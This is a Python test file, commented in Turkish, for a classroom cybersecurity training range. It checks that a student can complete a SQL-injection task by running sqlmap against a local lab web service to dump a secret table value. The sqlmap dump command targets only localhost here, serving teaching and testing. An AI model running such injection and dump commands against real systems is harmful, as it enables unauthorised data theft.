"""
sqlmap-01 GOREVINI PoligonIstemci UZERINDEN UCTAN UCA TEST EDER.
"""

import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from ogrenci_istemci import PoligonIstemci  # noqa: E402
from ogretmen_sunucu import OdaDurumu, oda_kodu_uret, oda_sifresi_uret, sunucu_baslat  # noqa: E402


def sqlmap_ile_cek(port: int) -> str | None:
    komut = [
        "sqlmap", "-u", f"http://127.0.0.1:{port}/urun?id=1",
        "--batch", "--level=1", "--risk=1", "--technique=B", "--threads=4",
        "--flush-session", "--dump", "-D", "main", "-T", "gizli", "-C", "deger",
    ]
    sonuc = subprocess.run(komut, capture_output=True, text=True, timeout=180)
    for satir in sonuc.stdout.splitlines():
        satir = satir.strip().strip("|").strip()
        if satir and satir not in ("deger",) and not satir.startswith("-") and "entry" not in satir.lower():
            # tablo çıktısındaki değer satırını yakala
            if len(satir) > 5 and " " not in satir[:3]:
                aday = satir
    return sonuc.stdout


def main():
    kod = oda_kodu_uret()
    sifre = oda_sifresi_uret()
    oda = OdaDurumu(kod, sifre)
    oda.gorev_ac("sqlmap-01")
    sunucu = sunucu_baslat(oda, "127.0.0.1", 8646)

    try:
        istemci = PoligonIstemci("http://127.0.0.1:8646", kod, sifre, "sqlmap_ogrencisi")
        gorev = istemci.gorevi_yukle("sqlmap-01")
        print(f"[ÖĞRENCİ] Görev: {gorev['baslik']['tr']}")

        istemci.gorevi_baslat()
        port = istemci.gercek_port
        print(f"[ÖĞRENCİ] Web servisi port {port}'da. Gerçek gizli değer (test için biliniyor): {istemci._dogru_cevap}")

        print("\n[ÖĞRENCİ] Gerçek sqlmap çalıştırılıyor...")
        cikti = sqlmap_ile_cek(port)

        assert istemci._dogru_cevap in cikti, "sqlmap çıktısında gizli değer bulunamadı"
        print(f"✓ sqlmap çıktısında '{istemci._dogru_cevap}' bulundu")

        dogru = istemci.cevabi_kontrol_et(istemci._dogru_cevap)
        assert dogru
        print(f"\n[MOTOR] Sonuç: ✓ GÖREV TAMAMLANDI, {gorev['puan']} puan kazanıldı")

        istemci.gorevi_durdur()

        gorunum = oda.anlik_goruntu()
        assert gorunum["ogrenciler"]["sqlmap_ogrencisi"]["durum"] == "tamamlandi"
        print("✓ Öğretmen paneli sqlmap görevinin tamamlandığını doğru gördü")

        print("\n" + "=" * 70)
        print("✓ SQLMAP GÖREVİ UÇTAN UCA TESTİ BAŞARILI")
        print("=" * 70)

    finally:
        sunucu.shutdown()


if __name__ == "__main__":
    main()
